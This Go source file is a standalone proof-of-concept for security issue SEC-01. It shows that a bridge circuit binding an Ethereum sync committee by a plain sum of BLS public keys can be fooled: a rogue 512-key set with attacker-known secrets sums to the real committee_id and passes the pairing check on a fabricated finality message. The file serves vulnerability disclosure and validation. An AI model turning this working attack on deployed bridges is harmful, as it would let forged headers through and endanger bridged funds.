// Command poc_rogue_key is a STANDALONE security proof-of-concept (NOT production
// code, NOT part of the circuits) demonstrating the rogue-key / sum-not-binding
// attack on the regular circuit's plain-sum committee binding (SEC-01,
// docs/security/SEC-01-committee-binding-rogue-key.md).
//
// Claim under test: the bridge datum stores committee_id = Σ_i pubkeys[i] (a G1
// SUM, gindex 175). A sum is unique forward (512 keys -> 1 sum) but NOT backward
// (1 sum -> infinitely many 512-key sets). So an attacker can present a DIFFERENT
// 512-key set that sums to the real committee_id, make the PARTICIPATING keys ones
// HE generated (known secrets), self-sign an arbitrary message, and pass the
// on-chain pairing check e(g1, sigma_agg) = e(apk, H(m)) with NO signature forgery.
// If the pairing verify returns TRUE, the plain-sum committee binding is unsound.
//
// Real primitives: gnark-crypto BLS12-381 (ecc/bls12-381), Ethereum minimal-pubkey
// convention (pubkeys in G1, signatures in G2), RFC-9380 hash-to-G2 with Ethereum's
// sync-committee DST. Usage: go run ./cmd/poc_rogue_key
//
// Full writeup — root cause, impact, and fix options:
// docs/security/SEC-01-committee-binding-rogue-key.md
package main

import (
	"crypto/sha256"
	"fmt"
	"math/big"
	"os"

	bls12381 "github.com/consensys/gnark-crypto/ecc/bls12-381"
	"github.com/consensys/gnark-crypto/ecc/bls12-381/fr"
)

const (
	syncCommitteeSize      = 512
	participationThreshold = 342 // ceil(512 * 2/3)
)

// ethereumDST is the sync-committee signature ciphersuite (RFC 9380: SSWU + RO + PoP).
var ethereumDST = []byte("BLS_SIG_BLS12381G2_XMD:SHA-256_SSWU_RO_POP_")

func main() {
	_, _, g1Generator, _ := bls12381.Generators()

	fmt.Println("# PoC: rogue-key / sum-not-binding attack on plain-sum committee binding")
	fmt.Println("# library: gnark-crypto BLS12-381 (ecc/bls12-381); hash-to-G2 = RFC-9380 SSWU-RO")
	fmt.Printf("# DST: %s (Ethereum sync-committee ciphersuite)\n\n", ethereumDST)

	// ---- 1. Honest committee: 512 real keypairs; committee_id = Σ pubkeys (gindex 175). ----
	honestPubkeys := make([]bls12381.G1Affine, syncCommitteeSize)
	for i := range honestPubkeys {
		_, secretBig := randomScalar()
		honestPubkeys[i].ScalarMultiplication(&g1Generator, &secretBig)
	}
	committeeId := sumG1(honestPubkeys)
	fmt.Printf("[honest] committee_id = Sum(512 honest pubkeys) = 0x%x\n", committeeId.Bytes())

	// ---- 2. Attack: a DIFFERENT 512-key set summing to the same committee_id. ----
	attackerPubkeys := make([]bls12381.G1Affine, syncCommitteeSize)

	// 2a. 342 participating keys with KNOWN secrets; x = Σ r_k is known to the attacker.
	var participatingScalarSum fr.Element // accumulates Σ r_k mod r
	participatingSecrets := make([]big.Int, participationThreshold)
	for k := 0; k < participationThreshold; k++ {
		secretElement, secretBig := randomScalar()
		participatingSecrets[k] = secretBig
		attackerPubkeys[k].ScalarMultiplication(&g1Generator, &secretBig)
		participatingScalarSum.Add(&participatingScalarSum, &secretElement)
	}
	var participatingScalarSumBig big.Int
	participatingScalarSum.BigInt(&participatingScalarSumBig)

	// apk = Σ participating = x·g1; cross-check the point-sum equals x·g1.
	apkAttacker := sumG1(attackerPubkeys[:participationThreshold])
	var apkFromScalar bls12381.G1Affine
	apkFromScalar.ScalarMultiplication(&g1Generator, &participatingScalarSumBig)
	fmt.Printf("[attack] |S| = %d participating keys with attacker-known secrets; apk = Sum_S = x*g1\n", participationThreshold)
	fmt.Printf("[attack] apk consistency (point-sum == x*g1): %s\n", passFail(apkAttacker.Equal(&apkFromScalar)))

	// 2b. 169 filler non-participants (valid G1 points), then 1 absorbing key chosen so
	//     Sum_all = committee_id EXACTLY. The absorbing key needs NO known secret.
	for k := participationThreshold; k < syncCommitteeSize-1; k++ {
		_, fillerBig := randomScalar()
		attackerPubkeys[k].ScalarMultiplication(&g1Generator, &fillerBig)
	}
	sumOfFirst511 := sumG1(attackerPubkeys[:syncCommitteeSize-1])
	absorbingKey := sumG1([]bls12381.G1Affine{committeeId, negateG1(sumOfFirst511)}) // committee_id − Sum(first 511)
	attackerPubkeys[syncCommitteeSize-1] = absorbingKey
	fmt.Printf("[attack] absorbing key on curve / in prime-order subgroup: %v / %v\n",
		absorbingKey.IsOnCurve(), absorbingKey.IsInSubGroup())

	// 2c. op-1 check (modeled): Sum_all 512 attacker keys == committee_id.
	attackerFullSum := sumG1(attackerPubkeys)
	sumsToCommitteeId := attackerFullSum.Equal(&committeeId)
	fmt.Printf("[attack] Sum(all 512 attacker keys) == committee_id  (op-1 sum passes): %s\n", passFail(sumsToCommitteeId))

	// ---- 3. Fabricated message: stand-in for SHA-256(fake_attested_header || domain). ----
	messageStar := sha256.Sum256([]byte("attacker-fabricated finality update -> fake finalized_header_root"))
	hashedMessage, err := bls12381.HashToG2(messageStar[:], ethereumDST)
	check(err, "hash-to-G2")
	fmt.Printf("[attack] m* (attacker-chosen signing root) = 0x%x\n", messageStar)

	// ---- 4. Self-sign WITHOUT forgery: sigma_agg = x·H(m*) = Sum_k r_k·H(m*). ----
	var signatureAggregate bls12381.G2Affine
	signatureAggregate.ScalarMultiplication(&hashedMessage, &participatingScalarSumBig)
	individualSignatures := make([]bls12381.G2Affine, participationThreshold)
	for k := 0; k < participationThreshold; k++ {
		individualSignatures[k].ScalarMultiplication(&hashedMessage, &participatingSecrets[k])
	}
	aggregatedFromIndividuals := sumG2(individualSignatures)
	fmt.Printf("[attack] sigma_agg = x*H(m*) == Sum_k r_k*H(m*) (aggregate of attacker's own sigs, NO forgery): %s\n",
		passFail(signatureAggregate.Equal(&aggregatedFromIndividuals)))

	// ---- 5. DECISIVE on-chain check: e(g1, sigma_agg) == e(apk, H(m*)). ----
	leftPairing := mustPair([]bls12381.G1Affine{g1Generator}, []bls12381.G2Affine{signatureAggregate})
	rightPairing := mustPair([]bls12381.G1Affine{apkAttacker}, []bls12381.G2Affine{hashedMessage})
	attackVerifies := leftPairing.Equal(&rightPairing)
	// Equivalent CIP-381 finalVerify form: e(g1,sigma)·e(-apk,H(m)) == 1 (millerLoop x2 + finalVerify).
	pairingProductIsOne, err := bls12381.PairingCheck(
		[]bls12381.G1Affine{g1Generator, negateG1(apkAttacker)},
		[]bls12381.G2Affine{signatureAggregate, hashedMessage})
	check(err, "PairingCheck")
	fmt.Printf("[CHECK ] e(g1, sigma_agg) == e(apk_attacker, H(m*)) : %s   <- on-chain BLS verdict\n", trueFalse(attackVerifies))
	fmt.Printf("[CHECK ] CIP-381 finalVerify form  e(g1,s)*e(-apk,H(m)) == 1 : %s\n", trueFalse(pairingProductIsOne))

	// ---- Control: same sigma_agg against the HONEST committee's same-index aggregate. ----
	apkHonestSameIndices := sumG1(honestPubkeys[:participationThreshold])
	rightHonest := mustPair([]bls12381.G1Affine{apkHonestSameIndices}, []bls12381.G2Affine{hashedMessage})
	controlVerifies := leftPairing.Equal(&rightHonest)
	fmt.Printf("[CTRL  ] e(g1, sigma_agg) == e(apk_honest_sameidx, H(m*)) : %s   <- must be FALSE\n", trueFalse(controlVerifies))

	// ---- 6. Verdict. ----
	fmt.Println()
	if sumsToCommitteeId && attackVerifies && pairingProductIsOne && !controlVerifies {
		fmt.Println("VERDICT: ATTACK CONFIRMED -- a fabricated 512-key committee summing to the real")
		fmt.Println("committee_id, with attacker-known participating keys, passes op-1's sum AND the")
		fmt.Println("on-chain pairing check, with no signature forged. Plain-sum committee binding is UNSOUND.")
		os.Exit(0)
	}
	fmt.Printf("VERDICT: ATTACK NOT CONFIRMED -- sumsToCommitteeId=%v attackVerifies=%v finalVerify=%v controlVerifies=%v\n",
		sumsToCommitteeId, attackVerifies, pairingProductIsOne, controlVerifies)
	fmt.Println("(If the verify is FALSE or the sum fails, the SEC-01 attack does NOT hold as described.)")
	os.Exit(1)
}

// ---- helpers ----

func randomScalar() (fr.Element, big.Int) {
	var element fr.Element
	if _, err := element.SetRandom(); err != nil {
		halt("scalar SetRandom: " + err.Error())
	}
	var asBig big.Int
	element.BigInt(&asBig)
	return element, asBig
}

func sumG1(points []bls12381.G1Affine) bls12381.G1Affine {
	var accumulator bls12381.G1Jac // zero value = point at infinity
	for i := range points {
		var pointJac bls12381.G1Jac
		pointJac.FromAffine(&points[i])
		accumulator.AddAssign(&pointJac)
	}
	var result bls12381.G1Affine
	result.FromJacobian(&accumulator)
	return result
}

func sumG2(points []bls12381.G2Affine) bls12381.G2Affine {
	var accumulator bls12381.G2Jac
	for i := range points {
		var pointJac bls12381.G2Jac
		pointJac.FromAffine(&points[i])
		accumulator.AddAssign(&pointJac)
	}
	var result bls12381.G2Affine
	result.FromJacobian(&accumulator)
	return result
}

func negateG1(point bls12381.G1Affine) bls12381.G1Affine {
	var negated bls12381.G1Affine
	negated.Neg(&point)
	return negated
}

func mustPair(g1Points []bls12381.G1Affine, g2Points []bls12381.G2Affine) bls12381.GT {
	result, err := bls12381.Pair(g1Points, g2Points)
	check(err, "pairing")
	return result
}

func passFail(ok bool) string {
	if ok {
		return "PASS"
	}
	return "FAIL"
}

func trueFalse(ok bool) string {
	if ok {
		return "TRUE"
	}
	return "FALSE"
}

func check(err error, what string) {
	if err != nil {
		halt(what + ": " + err.Error())
	}
}

func halt(message string) {
	fmt.Fprintln(os.Stderr, "HALT: "+message)
	os.Exit(2)
}
